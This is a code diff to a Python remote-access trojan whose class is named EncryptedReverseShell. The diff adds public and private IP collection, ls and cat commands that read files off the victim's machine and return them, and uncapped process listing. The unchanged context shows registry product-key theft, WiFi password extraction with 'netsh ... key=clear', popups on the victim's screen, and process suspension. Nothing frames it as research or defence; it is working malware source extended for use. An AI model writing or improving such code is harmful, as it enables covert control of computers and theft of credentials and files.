@@ -23,6 +23,7 @@ from PIL import ImageGrab
 import cv2
 import tkinter as tk
 from tkinter import messagebox
+import requests
 
 HOST = '127.0.0.1'
 
@@ -161,7 +162,7 @@ class EncryptedReverseShell:
             return False
 
     def get_product_key(self):
-        key_path = r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\"
+        key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\"
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
         value_name = "BackupProductKeyDefault"
         try:
@@ -177,7 +178,7 @@ class EncryptedReverseShell:
         return value
 
     def get_product_id(self):
-        key_path = r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
+        key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
         value_name = "ProductID"
         try:
@@ -196,6 +197,18 @@ class EncryptedReverseShell:
         else:
             return False
 
+    def get_public_ip(self):
+        try:
+            return requests.get('https://api.ipify.org').text
+        except:
+            return "Error of getting public ip!"
+        
+    def get_private_ip(self):
+        try:
+            return socket.gethostbyname(socket.gethostname())
+        except:
+            return "Error of getting private ip!"
+
     def get_system_info(self):
         info = {
             "system": platform.system(),
@@ -207,6 +220,8 @@ class EncryptedReverseShell:
             "username": os.getenv('USERNAME') or os.getenv('USER'),
             "current_dir": os.getcwd(),
             "encoding": self.get_system_encoding(),
+            "public_ip": self.get_public_ip(),
+            "private_ip": self.get_private_ip(),
         }
 
         if platform.system() == 'Windows':
@@ -242,14 +257,10 @@ class EncryptedReverseShell:
             if not message:
                 return {"error": "No message provided"}
             
-            # Create a hidden root window
             root = tk.Tk()
-            root.withdraw()  # Hide the main window
-            
-            # Make the message box appear on top
+            root.withdraw()
             root.attributes('-topmost', True)
             
-            # Show different types of message boxes
             if msg_type.lower() == "error":
                 messagebox.showerror(title, message)
             elif msg_type.lower() == "warning":
@@ -276,7 +287,7 @@ class EncryptedReverseShell:
                     "type": msg_type,
                     "response": "OK" if result else "Cancel"
                 }
-            else:  # info
+            else:
                 messagebox.showinfo(title, message)
             
             root.destroy()
@@ -378,17 +389,14 @@ class EncryptedReverseShell:
             if platform.system() != "Windows":
                 return {"error": "WiFi password extraction is only supported on Windows"}
             
-            # Get system encoding
             system_encoding = self.get_system_encoding()
             
-            # Get all WiFi profiles
             result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                   capture_output=True, timeout=10)
             
             if result.returncode != 0:
                 return {"error": "Failed to get WiFi profiles"}
             
-            # Try to decode with system encoding
             try:
                 output = result.stdout.decode(system_encoding, errors='replace')
             except:
@@ -396,7 +404,6 @@ class EncryptedReverseShell:
             
             profiles = []
             for line in output.split('\n'):
-                # Support multiple languages
                 if any(indicator in line for indicator in [
                     "All User Profile",
                     "Все профили пользователей",
@@ -408,7 +415,6 @@ class EncryptedReverseShell:
                         if profile:
                             profiles.append(profile)
             
-            # If no profiles found, try alternative parsing
             if not profiles:
                 for line in output.split('\n'):
                     line = line.strip()
@@ -416,7 +422,6 @@ class EncryptedReverseShell:
                         if ':' in line:
                             potential_profile = line.split(':', 1)[1].strip()
                             if potential_profile and len(potential_profile) > 1:
-                                # Verify it's a valid profile
                                 verify = subprocess.run(
                                     ['netsh', 'wlan', 'show', 'profile', potential_profile],
                                     capture_output=True,
@@ -431,7 +436,6 @@ class EncryptedReverseShell:
             wifi_passwords = []
             for profile in profiles:
                 try:
-                    # Get password for each profile
                     pwd_result = subprocess.run(
                         ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                         capture_output=True,
@@ -439,7 +443,6 @@ class EncryptedReverseShell:
                     )
                     
                     if pwd_result.returncode == 0:
-                        # Try multiple encodings for password output
                         pwd_output = None
                         for encoding in [system_encoding, 'utf-8', 'cp866', 'cp1251', 'windows-1251', 'latin-1']:
                             try:
@@ -457,7 +460,6 @@ class EncryptedReverseShell:
                         
                         password = "No password/Open network"
                         
-                        # Key indicators in different languages
                         key_indicators = [
                             "Key Content",
                             "Содержимое ключа", 
@@ -467,7 +469,6 @@ class EncryptedReverseShell:
                             "Contenuto chiave"
                         ]
                         
-                        # Find password in output
                         for line in pwd_output.split('\n'):
                             line_stripped = line.strip()
                             for indicator in key_indicators:
@@ -478,7 +479,6 @@ class EncryptedReverseShell:
                             if password != "No password/Open network":
                                 break
                         
-                        # Check if network has security
                         security_indicators = [
                             "Security key",
                             "Ключ безопасности",
@@ -537,17 +537,247 @@ class EncryptedReverseShell:
         except Exception as e:
             return {"error": f"Failed to get current directory: {str(e)}"}
 
+    def ls_directory(self, path=None):
+        """List directory contents with detailed info (like ls -la)"""
+        try:
+            if path is None:
+                path = os.getcwd()
+            
+            if not os.path.exists(path):
+                return {"error": f"Directory not found: {path}"}
+            
+            if not os.path.isdir(path):
+                return {"error": f"Not a directory: {path}"}
+            
+            items = []
+            
+            for item in os.listdir(path):
+                item_path = os.path.join(path, item)
+                try:
+                    stat = os.stat(item_path)
+                    mode = stat.st_mode
+                    
+                    if os.path.isdir(item_path):
+                        file_type = 'd'
+                    else:
+                        file_type = '-'
+                    
+                    owner_perm = (
+                        ('r' if mode & 0o400 else '-') +
+                        ('w' if mode & 0o200 else '-') +
+                        ('x' if mode & 0o100 else '-')
+                    )
+                    group_perm = (
+                        ('r' if mode & 0o040 else '-') +
+                        ('w' if mode & 0o020 else '-') +
+                        ('x' if mode & 0o010 else '-')
+                    )
+                    other_perm = (
+                        ('r' if mode & 0o004 else '-') +
+                        ('w' if mode & 0o002 else '-') +
+                        ('x' if mode & 0o001 else '-')
+                    )
+                    
+                    permissions = file_type + owner_perm + group_perm + other_perm
+                    n_links = stat.st_nlink
+                    
+                    if platform.system() == "Windows":
+                        owner = os.getenv('USERNAME', str(stat.st_uid))
+                        group = owner
+                    else:
+                        try:
+                            import pwd
+                            owner = pwd.getpwuid(stat.st_uid).pw_name
+                        except:
+                            owner = str(stat.st_uid)
+                        
+                        try:
+                            import grp
+                            group = grp.getgrgid(stat.st_gid).gr_name
+                        except:
+                            group = str(stat.st_gid)
+                    
+                    size = stat.st_size
+                    mtime = datetime.fromtimestamp(stat.st_mtime)
+                    mtime_str = mtime.strftime("%b %d %H:%M")
+                    
+                    name = item
+                    if os.path.isdir(item_path):
+                        name += '/'
+                    
+                    items.append({
+                        "permissions": permissions,
+                        "n_links": n_links,
+                        "owner": owner,
+                        "group": group,
+                        "size": size,
+                        "mtime": mtime_str,
+                        "name": name,
+                        "is_dir": os.path.isdir(item_path)
+                    })
+                    
+                except Exception as e:
+                    items.append({
+                        "permissions": "??????????",
+                        "n_links": "?",
+                        "owner": "?",
+                        "group": "?",
+                        "size": "?",
+                        "mtime": "?",
+                        "name": item,
+                        "is_dir": False,
+                        "error": str(e)
+                    })
+            
+            items.sort(key=lambda x: (not x.get('is_dir', False), x['name'].lower()))
+            
+            total_blocks = 0
+            for item in items:
+                if not item.get('error'):
+                    try:
+                        item_path = os.path.join(path, item['name'].rstrip('/'))
+                        stat = os.stat(item_path)
+                        if hasattr(stat, 'st_blocks'):
+                            total_blocks += stat.st_blocks
+                        else:
+                            total_blocks += (stat.st_size + 511) // 512
+                    except:
+                        pass
+            
+            return {
+                "directory": path,
+                "items": items,
+                "total": len(items),
+                "total_blocks": total_blocks
+            }
+        except Exception as e:
+            return {"error": f"Failed to list directory: {str(e)}"}
+
+    def cat_file(self, file_path):
+        """Read and return file contents"""
+        try:
+            if not os.path.exists(file_path):
+                return {"error": f"File not found: {file_path}"}
+            
+            if not os.path.isfile(file_path):
+                return {"error": f"Not a file: {file_path}"}
+            
+            file_size = os.path.getsize(file_path)
+            if file_size > 5 * 1024 * 1024:
+                return {"error": f"File too large to display (max 5MB): {file_size} bytes"}
+            
+            system_encoding = self.get_system_encoding()
+            
+            with open(file_path, 'rb') as f:
+                raw_data = f.read()
+            
+            # Проверяем, является ли файл текстовым (ищем нулевые байты)
+            is_binary = b'\x00' in raw_data[:1000]
+            
+            if is_binary:
+                return {
+                    "file_name": os.path.basename(file_path),
+                    "file_path": file_path,
+                    "file_size": file_size,
+                    "encoding": "base64 (binary file)",
+                    "content": base64.b64encode(raw_data).decode('utf-8'),
+                    "is_binary": True
+                }
+            
+            # Пробуем разные кодировки для текстовых файлов
+            encodings_to_try = []
+            
+            # Добавляем системную кодировку первой
+            if system_encoding not in encodings_to_try:
+                encodings_to_try.append(system_encoding)
+            
+            # Добавляем другие кодировки
+            additional_encodings = [
+                'utf-8',
+                'cp1251',      # Windows Cyrillic
+                'windows-1251', # Windows Cyrillic
+                'cp866',       # DOS Cyrillic
+                'koi8-r',      # Russian KOI8-R
+                'iso-8859-5',  # ISO Cyrillic
+                'latin-1',
+                'cp1252'       # Windows Western
+            ]
+            
+            for enc in additional_encodings:
+                if enc not in encodings_to_try:
+                    encodings_to_try.append(enc)
+            
+            # Пытаемся декодировать с каждой кодировкой
+            best_result = None
+            best_encoding = None
+            
+            for encoding in encodings_to_try:
+                try:
+                    decoded = raw_data.decode(encoding)
+                    
+                    # Проверяем, содержит ли текст кириллические символы
+                    has_cyrillic = any(
+                        'А' <= char <= 'я' or char in 'Ёё' 
+                        for char in decoded
+                    )
+                    
+                    # Если есть кириллица и это не utf-8, пробуем дальше
+                    if has_cyrillic and encoding != 'utf-8':
+                        # Проверяем, не является ли это на самом деле utf-8,
+                        # который случайно декодировался в другой кодировке
+                        try:
+                            raw_data.decode('utf-8')
+                            # Если utf-8 работает, используем его
+                            best_result = raw_data.decode('utf-8')
+                            best_encoding = 'utf-8'
+                            break
+                        except:
+                            pass
+                    
+                    # Сохраняем результат, если он выглядит нормально
+                    if best_result is None or (has_cyrillic and best_encoding != 'utf-8'):
+                        best_result = decoded
+                        best_encoding = encoding
+                        
+                        # Если нашли кириллицу, прекращаем поиск
+                        if has_cyrillic:
+                            break
+                            
+                except (UnicodeDecodeError, UnicodeError):
+                    continue
+            
+            if best_result is not None:
+                return {
+                    "file_name": os.path.basename(file_path),
+                    "file_path": file_path,
+                    "file_size": file_size,
+                    "encoding": best_encoding,
+                    "content": best_result,
+                    "is_binary": False
+                }
+            
+            # Если ничего не подошло, возвращаем в base64
+            return {
+                "file_name": os.path.basename(file_path),
+                "file_path": file_path,
+                "file_size": file_size,
+                "encoding": "base64 (unknown encoding)",
+                "content": base64.b64encode(raw_data).decode('utf-8'),
+                "is_binary": True
+            }
+            
+        except Exception as e:
+            return {"error": f"Failed to read file: {str(e)}"}
+
     def suspend_process(self, process_identifier):
         """Suspend a process by name or PID"""
         try:
             target_pid = None
             process_name = None
             
-            # Check if process_identifier is a PID (numeric)
             if isinstance(process_identifier, str) and process_identifier.isdigit():
                 target_pid = int(process_identifier)
             else:
-                # Assume it's a process name
                 if isinstance(process_identifier, str):
                     process_name = process_identifier
                     if not process_name.lower().endswith('.exe') and platform.system() == "Windows":
@@ -559,7 +789,6 @@ class EncryptedReverseShell:
             
             for proc in psutil.process_iter(['pid', 'name', 'status']):
                 try:
-                    # Match by PID or name
                     if target_pid is not None and proc.info['pid'] == target_pid:
                         process = psutil.Process(proc.info['pid'])
                         process.suspend()
@@ -597,7 +826,6 @@ class EncryptedReverseShell:
             if not url:
                 return {"error": "No URL provided"}
             
-            # Validate URL format
             if not url.startswith(('http://', 'https://')):
                 url = 'https://' + url
             
@@ -616,11 +844,9 @@ class EncryptedReverseShell:
             target_pid = None
             process_name = None
             
-            # Check if process_identifier is a PID (numeric)
             if isinstance(process_identifier, str) and process_identifier.isdigit():
                 target_pid = int(process_identifier)
             else:
-                # Assume it's a process name
                 if isinstance(process_identifier, str):
                     process_name = process_identifier
                     if not process_name.lower().endswith('.exe') and platform.system() == "Windows":
@@ -632,7 +858,6 @@ class EncryptedReverseShell:
             
             for proc in psutil.process_iter(['pid', 'name', 'status']):
                 try:
-                    # Match by PID or name
                     if target_pid is not None and proc.info['pid'] == target_pid:
                         process = psutil.Process(proc.info['pid'])
                         process_name_result = proc.info['name']
@@ -754,7 +979,7 @@ class EncryptedReverseShell:
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     continue
             
-            return {"processes": processes[:50]}
+            return {"processes": processes}
         except Exception as e:
             return {"error": f"Process list failed: {str(e)}"}
 
@@ -1261,6 +1486,18 @@ WantedBy=default.target
             
             elif cmd_type == "pwd":
                 return {"pwd_result": self.get_current_directory()}
+            
+            elif cmd_type == "ls":
+                path = command if command else None
+                result = self.ls_directory(path)
+                return {"ls_result": result}
+            
+            elif cmd_type == "cat":
+                if command:
+                    result = self.cat_file(command)
+                    return {"cat_result": result}
+                else:
+                    return {"error": "Please specify a file path"}
             
             elif cmd_type == "suspend":
                 if command:
